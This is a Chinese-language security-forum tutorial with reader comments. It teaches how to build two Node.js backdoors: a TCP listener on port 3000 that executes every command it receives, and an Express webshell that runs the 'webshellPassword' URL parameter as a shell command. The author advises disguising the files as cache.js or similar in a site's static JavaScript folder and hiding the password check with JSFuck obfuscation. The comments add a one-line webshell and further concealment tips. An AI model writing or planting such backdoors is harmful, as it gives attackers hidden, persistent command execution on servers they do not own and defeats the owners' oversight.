<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">NodeJs后门程序</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Black_Hole</a> <span class="bull">·</span> <time title="2015/12/03 10:23" ui-time="" datetime="2015/12/03 10:23" class="published ng-binding ng-isolate-scope">2015/12/03 10:23</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>从语言下手，来写一个市面没有的后面程序。</p><h1>0x01 为什么选择NodeJs</h1><hr><ol><li>我个人非常喜爱JavaScript这门语言，而我们今天所说的就是NodeJS，JavaScript语言的一个分支。NodeJS本身就是一个Web 服务器同时他还是一门后端语言，这一点尤其重要，因为我们只需要下载一个NodeJs就可以完成一系列操作，从而免去很多的麻烦。</li><li>而且即使被运维人员发现，也会以为是开发部门正在写有关NodeJs的项目。</li><li><p>NodeJs是一个非常年轻的语言，以至于很多人都没有学过。我见过运维人员懂PHP、Python的，但是懂NodeJs的，我是没见过。</p><p>接下来的篇章，我会使用telnet通信和web通信两个方式来写NodeJs后面程序。</p></li><li><p>下一篇再说</p></li></ol><h1>0x02 前期准备工作</h1><hr><p>有关NodeJs安装的，请自行百度。</p><p>我这里使用的是NodeJs版本是5.1.0</p><p><img alt="p1" img-src="8cb0196902ac3f5d533c403ae1550cbfaceffaa2.jpg"></p><p>NodeJs安装完成后，我们可以随便在哪一个目录建立一个NodeJs文件，当然我这里推荐在服务器网站上的静态目录里的JavaScript目录来写，因为都是JavaScript文件，有很大的隐蔽性。我嫌麻烦，就在~目录下建立一个nodeDemo目录来建立NodeJs文件了。</p><p>我这里建立的是app.js，当然名字随便取，你可以取base.js、cache.js、cookies.js等等，起到隐蔽性就行了。</p><h1>0x03 telnet通信后门</h1><hr><p>NodeJs里使用telnet进行通信的时候，需要调用<code>net</code>库和<code>child_process</code>库里的exec方法。</p><p>代码如下：</p><pre><code>var net = require('net');
var exec = require('child_process').exec;
</code></pre><p>然后使用createServer()函数来创建连接，代码如下：</p><pre><code>var server= net.createServer(function(conn){
    //code
});
</code></pre><p>接下来要解决字符串编码问题，不然乱码真的没法看：</p><pre><code>conn.setEncoding('utf8');
</code></pre><p>注意这里没有<code>-</code>，不是<code>utf-8</code>。切记。</p><p>为了好看，我还特意加上了<code>conn.write('\n')</code>;恩，这样好看多了。</p><p>OK，接下来就是连接成功后，处理输入的字符串了。这里需要用on函数：</p><pre><code>conn.on('data',function(data){
//code
});
</code></pre><p>在输入后的字符串里，删除掉回车字符串。</p><pre><code>data=data.replace('\r\n','');
</code></pre><p><strong>这段代码非常重要。</strong>我被这个坑卡了二十分钟。很多人可能会问不就是个回车么，按两次回车键怎么了。问题就在这。他这是ascll编码，也就是说你这个不会回车，而是回车的ascll编码，如果没有这个命令，你输入的命令都将无法使用，你用echo输出到的文件也会变成xxx.txt?这里并不是真正的?，而是系统无法显示出这个字符，而用?告诉人们，这是一个无法显示的字符串。</p><p>这里的data变量就是我们输入的命令了。接下来就要用到<code>child_process</code>库里的exec方法了。</p><pre><code>exec(data,function(error,stdout){
    //code
});
</code></pre><p>exec的第一个参数是data，也就是我们要运行的代码，后面的参数是个函数，这个函数里的一个参数是error，他是反馈命令中存在的错误。二个参数stdout是命令运行后的反馈。</p><p>我们先判断运行的命令中是否存在错误：</p><pre><code>if(error !== null){
    conn.write(error + '\n');
    return false;       
}
</code></pre><p>如果没有错误会反馈null字符串，我们就拿这个当做判断条件。Conn.write是在telnet终端反馈字符的，相当于php中的echo。</p><p><code>return false;</code>是防止程序继续向下执行。</p><p>接下来就是显示命令反馈了：</p><pre><code>conn.write('########################start\n\n' + stdout + '\n########################end\n\n');
</code></pre><p>为了更加的直观，我用#start和#end来标出反馈的区域。</p><p>server变量OK后，就是让程序监听端口运行了。</p><pre><code>server.listen(3000,function(){
    console.log('OK');
});
</code></pre><p>监听3000端口，并在终端中显示OK。</p><p>完整代码如下：</p><pre><code>var net = require('net');
var exec = require('child_process').exec;
var server= net.createServer(function(conn){
    conn.setEncoding('utf8');
    conn.write('\n');
    conn.on('data',function(data){
        data=data.replace('\r\n','');
        exec(data,function(error,stdout){
            if(error !== null){
                conn.write(error + '\n');
                return false;       
            }
            conn.write('########################start\n\n' + stdout + '\n########################end\n\n');
        });
    });
}); 

server.listen(3000,function(){
    console.log('OK');
});
</code></pre><p>现在让我们来测试一下：</p><p><img alt="p2" img-src="c918cac536243e55ffe66be74f9039620dba7fe8.jpg"></p><p>打开另一个终端，输入<code>telnet 127.0.0.1 3000</code></p><p><img alt="p3" img-src="6537eb63363989e01016c416c4b3b860ab25ffb3.jpg"></p><p>现在我们输入几条命令试下：</p><p><img alt="p4" img-src="b15f362f4d00b5ec3229c5711481c5e508fd3e97.jpg"></p><p><img alt="p5" img-src="9b2d032ce09e4f4aaaea892f73839f7ff9f40ef3.jpg"></p><p>OK了。现在只需要使用添加用户即可再次控制机器。</p><p>而这里有个缺陷，就是没有密码验证，我特意查了net库里的函数，但是没有找到密码验证，于是我想到了另一种方法来代替密码验证。代码如下：</p><pre><code>if(data.substring(0,2) == 'js'){
    data = data.substring(2);
}else{
    return false;
}
</code></pre><p>每一条命令的前面都加上js才会运行，如果没有，则什么都不输出。事例：</p><p><img alt="p6" img-src="ea5b2dcee03c6b89da799803e9df65f5dd69a841.jpg"></p><p>加上当我第一次输入ls的时候，程序并没有运行，当前面加上js字符串之后，命令才成功的运行。</p><p>直接写js字符串太显眼了，我们加密一下吧，因为NodeJs用的v8引擎，那么在浏览器里的JavaScript黑魔法，在NodeJs里也可以使用，我们打开<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a>把js加密下，加密后的字符串是：</p><pre><code>(+(!+[]+!+[]+!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]
</code></pre><p>如图：</p><p><img alt="p7" img-src="0bbd928850c8647c260bdc400f4c4cfba49e3023.jpg"></p><p>那么现在的NodeJs后门代码就变成这个样子：</p><p><img alt="p8" img-src="c5a04367f2f53449e398afef1dbc91ed8dea5c6c.jpg"></p><p>现在我们来测试一下能不能使用：</p><p><img alt="p9" img-src="f2edfb1e96c585f6ccb21b5df6258e54f5768222.jpg"></p><p>完美。</p><h1>0x03 web通信后门</h1><hr><p>上节说道使用telnet通信当做后门，那么现在我们来说一说web通信后门。</p><p>这里是使用了express框架吗，玩过NodeJs的人都知道，基本是NodeJs必装框架。</p><p>安装express框架请自行百度。</p><p>首先我们建立一个网站目录用于存放后面程序。</p><p>express node如图：</p><p><img alt="p10" img-src="193eaa247a71fa332935556f9ad64d81900c410d.jpg"></p><pre><code>cd node &amp;&amp; npm install
</code></pre><p>完成后，基本就OK了。现在我们进入到routes目录。修改index.js文件。</p><pre><code>vim router/index.js
</code></pre><p><img alt="p11" img-src="2e6017e7364d37511418d5b3f04fa9c7ffc6eede.jpg"></p><p>这是之前的index.js代码，现在我们来修改它。</p><p>在第三行加入代码：</p><pre><code>var exec = require('child_process').exec;
</code></pre><p>删除第6行代码，修改为：</p><pre><code>exec(req.query.webshellPassword,function(error,stdout){
    if(error !== null){
        res.send(error);
        return false;
    }
    res.send(stdout);
});
</code></pre><p>基本和上一节的telnet通信后门代码差不多。只是出现了如下代码：</p><pre><code>req.query.webshellPassword
</code></pre><p><code>req.query</code>是NodeJs获取URL参数的。webshellPassword是参数名。他相当于PHP代码里的：<code>$_GET['webshallPassword'];</code></p><p>完整代码如下：</p><p><img alt="p12" img-src="e068c5ce92b56d8eceecdd87f14850a7d4c91004.jpg"></p><p>现在我们进入到node目录。运行它：</p><p><img alt="p13" img-src="4f4d42e6a70d79a736a3a7ee500bebbbacf6bbda.jpg"></p><p>打开浏览器，输入<code>http://127.0.0.1:3000/?webshellPassword=ls</code></p><p>结果如下：</p><p><img alt="p14" img-src="3df91671ffaa1e75252a41bde10b3c1cb8b40862.jpg"></p><p>浏如果是window系统，没有装linux命令集的话，请把ls改成dir。</p><p>我们来大致看一下能做哪些事：</p><p><img alt="p15" img-src="e5e3b24448d7c061d99f4fb61a99dc6f41527b92.jpg"></p><p><img alt="p16" img-src="568a2ee250cfbe7823b94a6ff8ce76dda5560404.jpg"></p><p><img alt="p17" img-src="ad3fbd9435069d15a6fab6692478798181bceebc.jpg"></p><p><img alt="p18" img-src="df62a3af1c4a62ad5e08e6ee457bf2581b9d3276.jpg"></p><p>想干啥都可以，心情瞬间变得更美丽的呢。</p><p>下一章将说到使用网站来管理后门。麻麻再也不用担心我天天抱着电脑了呢。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/4070" rel="bookmark" id="re1">HCTF writeup(web)</a></li><li><a href="http://drops.wooyun.org/tips/12386" rel="bookmark" id="re2">JavaScript Phishing</a></li><li><a href="http://drops.wooyun.org/tips/1322" rel="bookmark" id="re3">最新webqq密码的加密方式分析过程</a></li><li><a href="http://drops.wooyun.org/tips/6449" rel="bookmark" id="re4">Hacking PostgreSQL</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0xCCCC</span> <span class="reply-time">2016-03-10 21:48:56</span></div><p></p><p>何苦要 express</p><p>require(&#039;http&#039;).createServer(function(req, res) {require(&#039;child_process&#039;).exec(decodeURIComponent(req.url).substr(1), function(err, stdout, stderr) {res.end(stdout)})}).listen(2333);</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">爱捣蛋的鬼</span> <span class="reply-time">2015-12-12 15:30:26</span></div><p></p><p>项目上线很少热部署把，都会用新的覆盖，一覆盖你的就没了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">傲娇猪皮</span> <span class="weibo"></span> <span class="reply-time">2015-12-04 10:34:32</span></div><p></p><p>我次奥，我居然能看懂！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xser233</span> <span class="reply-time">2015-12-03 23:14:21</span></div><p></p><p>https://github.com/ayiis/webShell/blob/master/customize/nodejs/customize.js<br>能给我俩wb进社区嘛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Black-Hole</span> <span class="reply-time">2015-12-03 23:03:16</span></div><p></p><p>楼下乱码了，请移步到http://zone.wooyun.org/content/24231</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Black-Hole</span> <span class="reply-time">2015-12-03 23:02:27</span></div><p></p><p>第0x03节的web通信后门，存在bug。html直接解析、win下乱码。修改了部分代码，已经解决：<br>var express = require(&#039;express&#039;);<br>var router = express.Router();<br>var exec = require(&#039;child_process&#039;).exec;<br>var iconv = require(&#039;iconv-lite&#039;);</p><p>function unhtml(str, reg) {<br>return str ? str.replace(reg || /[&amp;&lt;&quot;&gt;&#039;](?:(amp|lt|quot|gt|#39|nbsp|#\d+);)?/g, function (a, b) {<br>if(b){<br>a;<br>}else{<br>return {<br>&#039;&lt;&#039;:&#039;&amp;lt;&#039;,<br>&#039;&amp;&#039;:&#039;&amp;amp;&#039;,<br>&#039;&quot;&#039;:&#039;&amp;quot;&#039;,<br>&#039;&gt;&#039;:&#039;&amp;gt;&#039;,<br>&quot;&#039;&quot;:&#039;&#039;&#039;,<br>}[a]<br>}<br>}) : &#039;&#039;;<br>}</p><p>router.get(&#039;/&#039;,function(req, res, next){<br>exec(req.query.webshellPassword,{encoding: &#039;binary&#039;},function(error,stdout){<br>if(error !== null){<br>res.send(error);<br>return false;<br>}<br>var str = iconv.decode(stdout, &#039;GBK&#039;);<br>res.send(&#039;&lt;pre&gt;&#039; + unhtml(str) + &#039;&lt;/pre&gt;&#039;);<br>});<br>});</p><p>module.exports = router;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Her0in</span> <span class="reply-time">2015-12-03 15:50:38</span></div><p></p><p>自导自演。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SPRITEKING</span> <span class="reply-time">2015-12-03 15:42:03</span></div><p></p><p>这么多乱码 眼睛都看怀孕了....</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">theBigFace</span> <span class="reply-time">2015-12-03 15:23:44</span></div><p></p><p>水文</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Black-Hole_</span> <span class="weibo"></span> <span class="reply-time">2015-12-03 14:37:50</span></div><p></p><p>下次记得at</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2015-12-03 14:20:59</span></div><p></p><p>jsfuck一看就不正常，最好用base加密到32位，看着像MD5不容易引起注意。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">CalvinCyanZero</span> <span class="weibo"></span> <span class="reply-time">2015-12-03 12:47:22</span></div><p></p><p>mk</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mramydnei</span> <span class="reply-time">2015-12-03 11:31:26</span></div><p></p><p>而且即使被运维人员发现，也会以为是开发部门正在写有关NodeJs的项目。</p><p>作为运维我觉得这条太牵强了。开发组和运维组共享预定计划表是常识。详细到作业时间，作业内容，谁允许修改的，为什么要修改以及当天操作时ssh客户端留下来的所有日志。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ysql404</span> <span class="reply-time">2015-12-03 11:20:02</span></div><p></p><p>厉害</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">justforfun</span> <span class="reply-time">2015-12-03 11:07:29</span></div><p></p><p>牛逼。。</p><p></p></div></div></div></div></div></main>